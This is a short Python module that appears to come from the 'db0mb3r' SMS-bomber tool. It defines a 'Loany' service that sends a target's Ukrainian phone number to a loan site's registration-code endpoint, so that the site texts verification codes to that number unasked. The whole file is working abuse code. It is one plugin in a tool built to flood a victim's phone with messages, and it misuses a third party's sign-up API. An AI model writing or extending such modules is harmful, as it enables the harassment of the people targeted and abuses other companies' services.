from db0mb3r.services.service import Service


class Loany(Service):
    phone_codes = [380]

    async def run(self):
        await self.post(
            "https://loany.com.ua/funct/ajax/registration/code",
            data={"phone": self.formatted_phone},
        )
